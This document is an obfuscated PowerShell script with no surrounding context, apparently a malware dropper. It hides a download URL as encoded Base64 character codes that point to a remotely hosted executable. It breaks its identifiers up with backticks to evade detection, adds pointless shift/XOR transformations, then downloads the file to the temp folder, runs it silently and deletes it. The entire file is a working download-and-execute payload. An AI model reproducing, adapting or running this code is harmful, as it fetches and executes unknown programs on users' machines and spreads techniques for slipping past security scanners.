function G`e`t`-`R`n`d`C`h`r {
    param (
        [int]$l`
    )
    return -join ((65..90) | Get-Random -Count $l | ForEach-Object { [char]$_ })
}

$e`n`c`U`r`l` = [StRiNg]::JoIn(' ', [ChaR[]](97, 72, 82, 48, 99, 72, 77, 54, 76, 121, 57, 110, 97, 88, 82, 111, 100, 87, 73, 117, 89, 50, 57, 116, 76, 50, 53, 49, 98, 71, 119, 116, 99, 68, 82, 117, 76, 50, 53, 112, 89, 50, 86, 106, 98, 50, 49, 119, 100, 88, 82, 108, 99, 105, 57, 121, 89, 88, 99, 118, 99, 109, 86, 109, 99, 121, 57, 111, 90, 87, 70, 107, 99, 121, 57, 116, 89, 87, 108, 117, 76, 50, 49, 104, 99, 109, 108, 118, 88, 50, 82, 112, 99, 51, 81, 117, 90, 88, 104, 108))

function D`e`c`-`B`6`4 {
    param (
        [string]$e`n`c`S`t`r`
    )
    try {
        return [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($e`n`c`S`t`r`))
    } catch {
        Write-Error "Failed : $_`"
        return $n`u`l`l`
    }
}

$d`e`c`U`r`l` = D`e`c`-`B`6`4 -e`n`c`S`t`r $e`n`c`U`r`l`

function D`w`n`-`F`l {
    param (
        [string]$u`r`l`
    )
    try {
        $o`u`t`p`u`t` = [System.IO.Path]::Combine($e`n`v`:T`E`M`P`, [System.IO.Path]::GetFileName($u`r`l`))
        $c`l`i`e`n`t` = N`e`w`-`O`b`j`e`c`t` S`y`s`t`e`m`.`N`e`t`.`W`e`b`C`l`i`e`n`t`
        $c`l`i`e`n`t`.DownloadFile($u`r`l`, $o`u`t`p`u`t`)
        return $o`u`t`p`u`t`
    } catch {
        Write-Error "Failed : $_`"
        return $n`u`l`l`
    }
}

function E`x`e`-`F`l {
    param (
        [string]$f`i`l`e`P`a`t`h`
    )
    try {
        Start-Process -FilePath $f`i`l`e`P`a`t`h` -NoNewWindow -Wait
    } catch {
        Write-Error "Failed : $_`"
    }
}

function S`h`f`t`-`C`h`r {
    param (
        [string]$i`n`p`u`t`S`t`r`,
        [int]$s`h`f`t`
    )
    try {
        $r`e`s`u`l`t` = ""
        foreach ($c`h`r` in $i`n`p`u`t`S`t`r`.ToCharArray()) {
            $r`e`s`u`l`t` += [char](([byte]$c`h`r` + $s`h`f`t`) -band 0xFF)
        }
        return $r`e`s`u`l`t`
    } catch {
        Write-Error "Failed : $_`"
        return $n`u`l`l`
    }
}

function X`o`r`-`C`h`r {
    param (
        [string]$i`n`p`u`t`S`t`r`,
        [int]$k`e`y`
    )
    try {
        $r`e`s`u`l`t` = ""
        foreach ($c`h`r` in $i`n`p`u`t`S`t`r`.ToCharArray()) {
            $r`e`s`u`l`t` += [char](([byte]$c`h`r` -bxor $k`e`y`) -band 0xFF)
        }
        return $r`e`s`u`l`t`
    } catch {
        Write-Error "Failed : $_`"
        return $n`u`l`l`
    }
}

$o`b`f`U`r`l` = S`h`f`t`-`C`h`r -i`n`p`u`t`S`t`r $d`e`c`U`r`l -s`h`f`t 1
$o`b`f`U`r`l` = X`o`r`-`C`h`r -i`n`p`u`t`S`t`r $o`b`f`U`r`l -k`e`y 5

$d`e`O`b`f`U`r`l` = X`o`r`-`C`h`r -i`n`p`u`t`S`t`r $o`b`f`U`r`l -k`e`y 5
$d`e`O`b`f`U`r`l` = S`h`f`t`-`C`h`r -i`n`p`u`t`S`t`r $d`e`O`b`f`U`r`l -s`h`f`t -1

$f`l`P`a`t`h` = D`w`n`-`F`l -u`r`l $d`e`O`b`f`U`r`l`

if ($f`l`P`a`t`h) {
    E`x`e`-`F`l -f`i`l`e`P`a`t`h $f`l`P`a`t`h
    Remove-Item -Path $f`l`P`a`t`h
}
